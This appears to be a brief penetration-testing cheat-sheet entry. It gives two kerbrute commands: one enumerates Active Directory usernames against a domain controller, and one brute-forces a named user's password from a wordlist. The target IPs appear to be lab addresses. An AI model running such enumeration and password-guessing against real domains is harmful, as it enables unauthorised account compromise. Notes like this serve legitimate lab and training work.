## Bruteforce user names from user list

```
kerbrute userenum --dc 10.10.10.175 -d EGO.LOCAL users.txt
```


--> Note, if user does not exist, then kerbrute is smart enough to skip user
```
kerbrute -domain THINC.LOCAL -dc-ip 10.11.1.220 -user alice -passwords password.txt
 -debug
```

